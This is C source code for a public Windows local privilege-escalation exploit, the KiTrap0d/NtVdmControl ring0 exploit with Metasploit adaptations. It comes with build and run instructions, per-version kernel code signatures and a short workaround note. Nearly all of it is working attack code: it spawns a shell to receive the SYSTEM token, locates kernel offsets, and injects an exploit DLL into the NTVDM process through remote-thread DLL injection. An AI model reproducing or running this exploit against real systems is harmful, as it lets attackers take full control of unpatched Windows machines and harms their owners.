//
// --------------------------------------------------
// Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit
// -------------------------------------------- taviso@sdf.lonestar.org ---
//
// Tavis Ormandy, June 2009.
//
// INTRODUCTION
//
// I'm not usually interested in Windows exploits (I'm a UNIX guy), but this
// bug was so unusual I felt it deserved some special attention :-)
//
// I believe every single release of Windows NT since version 3.1 (1993) up to
// and including Windows 7 (2009) contain this error.
//
// KNOWN BUGS
//
//      * If KernelGetProcByName() ever fails, I'm probably in trouble.
//      * I hardcode several paths instead of expanding %SYSTEMROOT%.
//      * I probably need to VirtualLock() some stuff.
//      * I suspect this is unreliable on mp kernels.
//
// INSTRUCTIONS
//
//      C:\> nmake
//      C:\> vdmallowed.exe
//
// WORKAROUND
//
//      Disabling the MSDOS and WOWEXEC subsystems will prevent the exploit
//      from functioning.
//
//      http://support.microsoft.com/kb/220159
//
// GREETZ
//
//      Julien, Lcamtuf, Spoonm, Neel, Skylined, Redpig, and others.
//


//
// This code was slightly tweaked for use in a Meterpreter script, the changes
// allow an unrelated PID to receive the SYSTEM token. Some minor cleanups were
// made as well, mostly around resolving the system32 directory.
//
// Long-term, this will be reimplemented as an additional vector in the priv
// extension.
//
// This code now uses twunk_16.exe instead of debug.exe for compatibility.
//
// - hdm[at]metasploit.com 2010/01/25
//


// Windows 2000 fails to find the VDM_TIB size (something else is wrong)
// Windows 2008 Storage Server has 16-bit applications disabled by default
// Windows 2008 Storage Server is also missing twunk_16.exe, has debug.exe



#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS // I prefer the definitions from ntstatus.h
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#include <stdarg.h>
#include <tchar.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#pragma comment(lib, "advapi32")

#define PAGE_SIZE 0x1000

enum { SystemModuleInformation = 11 };

typedef struct {
	ULONG   Unknown1;
	ULONG   Unknown2;
	PVOID   Base;
	ULONG   Size;
	ULONG   Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct {
	ULONG   Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct CodeSignature {
	UCHAR Signature[16];
	DWORD Version;
};


// These are generated using kd -kl -c 'db nt!Ki386BiosCallReturnAddress;q'
struct CodeSignature CodeSignatures[] = {
	{ "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00", 0 }, // Windows NT4
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84", 1 }, // Windows 2000
	{ "\x64\xA1\x1C\x00\x00\x00\x5F\x8B\x70\x04\xB9\x84\x00\x00\x00\x89", 1 }, // Windows 2000 SP4 Advanced Server
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84", 2 }, // Windows XP
	{ "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00", 3 }, // Windows 2003
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 3 }, // Windows .NET
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 4 }, // Windows Vista
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 5 }, // Windows 2008
	{ "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00", 6 }, // Windows 7
	{ "", -1 }
};

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

BOOL PrepareProcessForSystemToken(PCHAR Application, PDWORD ProcessId);
BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR Application, PHANDLE ProcessHandle);
BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread);
BOOL LogMessage(LEVEL Level, PCHAR Format, ...);
BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase);

int main(int argc, char **argv)
{
	HANDLE VdmHandle;
	HANDLE RemoteThread;
	DWORD ShellPid = 0;
	DWORD KillPid = 0;
	DWORD ThreadCode;
	DWORD KernelBase;
	TCHAR VDMPath[_MAX_PATH];
	TCHAR CMDPath[_MAX_PATH];
	CHAR Buf[32];
	DWORD Offset;

	if(argc > 1)
		ShellPid = atoi(argv[1]);

	LogMessage(L_INFO,
		"\r"
		"--------------------------------------------------\n"
		"Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit\n"
		"-------------------------------------------- taviso@sdf.lonestar.org ---\n"
		"\n"
		);

	GetWindowsDirectory(VDMPath, _MAX_PATH);
	_tcscat_s(VDMPath, _MAX_PATH, _T("\\twunk_16.exe"));

	if (GetFileAttributes(VDMPath) == INVALID_FILE_ATTRIBUTES) {
		GetSystemDirectory(VDMPath, _MAX_PATH);
		_tcscat_s(VDMPath, _MAX_PATH, _T("\\debug.exe"));

		if (GetFileAttributes(VDMPath) == INVALID_FILE_ATTRIBUTES) {
			LogMessage(L_INFO, "Could not find twunk_16.exe or debug.exe");
			return(0);
		}
	}

	GetSystemDirectory(CMDPath, _MAX_PATH);
	_tcscat_s(CMDPath, _MAX_PATH, _T("\\cmd.exe"));

	if(! ShellPid) {
		// Spawn the process to be elevated to SYSTEM.
		LogMessage(L_INFO, "Spawning a shell to give SYSTEM token (do not close it)");

		if (PrepareProcessForSystemToken(CMDPath, &ShellPid) != TRUE) {
			LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
			goto finished;
		}
	}

	// Scan kernel image for the required code sequence, and find the base address.
	if (ScanForCodeSignature(&KernelBase, &Offset) == FALSE) {
		LogMessage(L_ERROR, "ScanForCodeSignature() returned failure");
		goto finished;
	}

	// Pass the parameters required by exploit thread to NTVDM.
	SetEnvironmentVariable("VDM_TARGET_PID", (sprintf(Buf, "%#x", ShellPid), Buf));
	SetEnvironmentVariable("VDM_TARGET_KRN", (sprintf(Buf, "%#x", KernelBase), Buf));
	SetEnvironmentVariable("VDM_TARGET_OFF", (sprintf(Buf, "%#x", Offset), Buf));

	// Invoke the NTVDM subsystem, by launching any MS-DOS executable.
	LogMessage(L_INFO, "Starting the NTVDM subsystem by launching MS-DOS executable");

	if (SpawnNTVDMAndGetUsefulAccess(VDMPath, &VdmHandle) == FALSE) {
		LogMessage(L_ERROR, "SpawnNTVDMAndGetUsefulAccess() returned failure");
		goto finished;
	}

	// Start the exploit thread in the NTVDM process.
	LogMessage(L_DEBUG, "Injecting the exploit thread into NTVDM subsystem @%#x", VdmHandle);

	if (InjectDLLIntoProcess("VDMEXPLOIT.DLL", VdmHandle, &RemoteThread) == FALSE) {
		LogMessage(L_ERROR, "InjectDLLIntoProcess() returned failure");
		goto finished;
	}


	// Wait for the thread to complete
	LogMessage(L_DEBUG, "WaitForSingleObject(%#x, INFINITE);", RemoteThread);

	WaitForSingleObject(RemoteThread, INFINITE);


	// I pass some information back via the exit code to indicate what happened.
	GetExitCodeThread(RemoteThread, &ThreadCode);

	LogMessage(L_DEBUG, "GetExitCodeThread(%#x, %p); => %#x", RemoteThread, &ThreadCode, ThreadCode);

	switch (ThreadCode) {
		case 'VTIB':
			// A data structure supplied to the kernel called VDM_TIB has to have a `size` field that
			// matches what the kernel expects.
			// Try running `kd -kl -c 'uf nt!VdmpGetVdmTib;q'` and looking for the size comparison.
			LogMessage(L_ERROR, "The exploit thread was unable to find the size of the VDM_TIB structure");
			break;
		case 'NTAV':
			// NtAllocateVirtualMemory() can usually be used to map the NULL page, which NtVdmControl()
			// expects to be present.
			// The exploit thread reports it didn't work.
			LogMessage(L_ERROR, "The exploit thread was unable to map the virtual 8086 address space");
			break;
		case 'VDMC':
			// NtVdmControl() must be initialised before you can begin vm86 execution, but it failed.
			// It's entirely undocumented, so you'll have to use kd to step through it and find out why
			// it's failing.
			LogMessage(L_ERROR, "The exploit thread reports NtVdmControl() failed");
			break;
		case 'LPID':
			// This exploit will try to transplant the token from PsInitialSystemProcess on to an
			// unprivileged process owned by you.
			// PsLookupProcessByProcessId() failed when trying to find your process.
			LogMessage(L_ERROR, "The exploit thread reports that PsLookupProcessByProcessId() failed");
			break;
		case FALSE:
			// This probably means LoadLibrary() failed, perhaps the exploit dll could not be found?
			// Verify the vdmexploit.dll file exists, is readable and is in a suitable location.
			LogMessage(L_ERROR, "The exploit thread was unable to load the injected dll");
			break;
		case 'w00t':
			// This means the exploit payload was executed at ring0 and succeeded.
			LogMessage(L_INFO, "The exploit thread reports exploitation was successful");
			if(! KillPid)
				LogMessage(L_INFO, "w00t! You can now use the shell opened earlier");
			break;
		default:
			// Unknown error. Sorry, you're on your own.
			LogMessage(L_ERROR, "The exploit thread returned an unexpected error, %#x", ThreadCode);
			break;
	}

	TerminateProcess(VdmHandle, 0);
	CloseHandle(VdmHandle);
	CloseHandle(RemoteThread);

	if(KillPid) {
		LogMessage(L_INFO, "Killing the temporary process handle with pid %d", KillPid);
		VdmHandle = OpenProcess( PROCESS_TERMINATE, FALSE, KillPid );
		if(VdmHandle && VdmHandle != INVALID_HANDLE_VALUE) {
			TerminateProcess(VdmHandle, 0);
		}
	}

finished:
	return 0;
}

// Start a process to give SYSTEM token to.
static BOOL PrepareProcessForSystemToken(PCHAR App, PDWORD ProcessId)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	if (CreateProcess(App, App, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE) {
		LogMessage(L_ERROR, "CreateProcess(\"%s\") returned failure, %#x", App, GetLastError());
		return FALSE;
	}

	LogMessage(L_DEBUG, "CreateProcess(\"%s\") => %u", App, pi.dwProcessId);

	*ProcessId = pi.dwProcessId;
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return TRUE;
}

// Grab a useful Handle to NTVDM.
static BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR App, PHANDLE ProcessHandle)
{
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO si = { sizeof si };
	ULONG i;

	// Start the child process, which should invoke NTVDM.
	if (CreateProcess(App, App, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == FALSE) {
		LogMessage(L_ERROR, "CreateProcess(\"%s\") failed, %#x", App, GetLastError());
		return FALSE;
	}

	LogMessage(L_DEBUG, "CreateProcess(\"%s\") => %u", App, pi.dwProcessId);

	// Get more access
	if ((*ProcessHandle = OpenProcess(PROCESS_CREATE_THREAD
		| PROCESS_QUERY_INFORMATION
		| PROCESS_VM_OPERATION
		| PROCESS_VM_WRITE
		| PROCESS_VM_READ
		| PROCESS_TERMINATE,
		FALSE,
		pi.dwProcessId)) == NULL) {
			LogMessage(L_ERROR, "OpenProcess(%u) failed, %#x", pi.dwProcessId, GetLastError());
			TerminateProcess(pi.hProcess, 'SPWN');
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			return FALSE;
	}

	LogMessage(L_DEBUG, "OpenProcess(%u) => %#x", pi.dwProcessId, *ProcessHandle);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return TRUE;
}

// Use the DLL Injection technique to access the NTVDM process.
// http://en.wikipedia.org/wiki/DLL_injection
static BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread)
{
	PVOID RemotePage;
	LPTHREAD_START_ROUTINE StartRoutine;

	assert(ProcessHandle != INVALID_HANDLE_VALUE);
	assert(DllPath);
	assert(RemoteThread);

	// Allocate a page in the child process
	if ((RemotePage = VirtualAllocEx(ProcessHandle, NULL, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE)) == NULL) {
		LogMessage(L_ERROR, "VirtualAllocEx() returned failure, %#x", GetLastError());
		return FALSE;
	}

	// Write in the name of my DLL (note, memory is already zeroed)
	if (WriteProcessMemory(ProcessHandle, RemotePage, DllPath, strlen(DllPath), NULL) == FALSE) {
		LogMessage(L_ERROR, "WriteProcessMemory(%p) returned failure, %#x", RemotePage, GetLastError());
		return FALSE;
	}

	LogMessage(L_DEBUG, "WriteProcessMemory(%#x, %#x, \"%s\", %u);",
		ProcessHandle,
		RemotePage,
		DllPath,
		strlen(DllPath));

	// Execute it in child process, loading the specified library
	*RemoteThread = CreateRemoteThread(ProcessHandle,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)
		GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA"),
		RemotePage,
		0,
		NULL);
	CloseHandle(ProcessHandle);

	return *RemoteThread != NULL;
}

// Scan the appropriate kernel image for the correct offset
BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
{
	FARPROC NtQuerySystemInformation;
	HMODULE KernelHandle;
	PIMAGE_DOS_HEADER DosHeader;
	PIMAGE_NT_HEADERS PeHeader;
	PIMAGE_OPTIONAL_HEADER OptHeader;
	OSVERSIONINFO osvi = { sizeof osvi };
	PBYTE ImageBase;
	DWORD PhysicalAddressExtensions, DataSize;
	ULONG i,x;
	HKEY MmHandle;
	SYSTEM_MODULE_INFORMATION ModuleInfo = {0};

	// List of versions I have code signatures for.
	enum {
		MICROSOFT_WINDOWS_NT4   = 0,
		MICROSOFT_WINDOWS_2000  = 1,
		MICROSOFT_WINDOWS_XP    = 2,
		MICROSOFT_WINDOWS_2003  = 3,
		MICROSOFT_WINDOWS_VISTA = 4,
		MICROSOFT_WINDOWS_2008  = 5,
		MICROSOFT_WINDOWS_7     = 6,
	} Version = MICROSOFT_WINDOWS_7;

	// NtQuerySystemInformation can be used to find kernel base address
	NtQuerySystemInformation = GetProcAddress(GetModuleHandle("NTDLL"), "NtQuerySystemInformation");

	// Determine kernel version so that the correct code signature is used
	GetVersionEx(&osvi);

	LogMessage(L_DEBUG, "GetVersionEx() => %u.%u", osvi.dwMajorVersion, osvi.dwMinorVersion);

	if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
		Version = MICROSOFT_WINDOWS_NT4;
	if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
		Version = MICROSOFT_WINDOWS_2000;
	if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
		Version = MICROSOFT_WINDOWS_XP;
	if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
		Version = MICROSOFT_WINDOWS_2003;
	if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
		Version = MICROSOFT_WINDOWS_VISTA;
	if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
		Version = MICROSOFT_WINDOWS_2008;
	if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
		Version = MICROSOFT_WINDOWS_7;

	// Learn the loaded kernel (e.g. NTKRNLPA vs NTOSKRNL), and it's base address
	NtQuerySystemInformation(SystemModuleInformation, &ModuleInfo, sizeof ModuleInfo, NULL);

	LogMessage(L_DEBUG, "NtQuerySystemInformation() => %s@%p",
		ModuleInfo.Module[0].ImageName,
		ModuleInfo.Module[0].Base);

	// Load the kernel image specified
	if ((KernelHandle = LoadLibrary(strrchr(ModuleInfo.Module[0].ImageName, '\\') + 1)) == NULL) {
		LogMessage(L_ERROR, "LoadLibrary() returned failure, %#x", GetLastError());
		return FALSE;
	}

	// Parse image headers
	*KernelBase                 = (DWORD) ModuleInfo.Module[0].Base;
	ImageBase                   = (PBYTE) KernelHandle;
	DosHeader                   = (PIMAGE_DOS_HEADER)(ImageBase);
	PeHeader                    = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
	OptHeader                   = &PeHeader->OptionalHeader;

	LogMessage(L_DEBUG, "Searching for kernel %u.%u signature: version %d...",
		osvi.dwMajorVersion,
		osvi.dwMinorVersion,
		Version
	);

	for (x=0;;x++) {

		if(CodeSignatures[x].Version == -1)
			break;

		if(CodeSignatures[x].Version != Version)
			continue;

		LogMessage(L_INFO, "Trying signature with index %d", x);

		// Scan for the appropriate signature
		for (i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++) {
			if (memcmp(&ImageBase[i], CodeSignatures[x].Signature, sizeof CodeSignatures[x].Signature) == 0) {
				LogMessage(L_INFO, "Signature found %#x bytes from kernel base", i);

				*OffsetFromBase = i;
				FreeLibrary(KernelHandle);
				return TRUE;
			}
		}
	}

	LogMessage(L_ERROR, "Code not found, the signatures need to be updated for your kernel");

	FreeLibrary(KernelHandle);

	return FALSE;
}

// A quick logging routine for debug messages.
BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
{
	CHAR Buffer[1024] = {0};
	va_list Args;

	va_start(Args, Format);
	vsnprintf_s(Buffer, sizeof Buffer, _TRUNCATE, Format, Args);
	va_end(Args);

	switch (Level) {
		case L_DEBUG: fprintf(stdout, "[?] %s\n", Buffer); break;
		case L_INFO:  fprintf(stdout, "[+] %s\n", Buffer); break;
		case L_WARN:  fprintf(stderr, "[*] %s\n", Buffer); break;
		case L_ERROR: fprintf(stderr, "[!] %s\n\a", Buffer); break;
	}

	fflush(stdout);
	fflush(stderr);

	return TRUE;
}

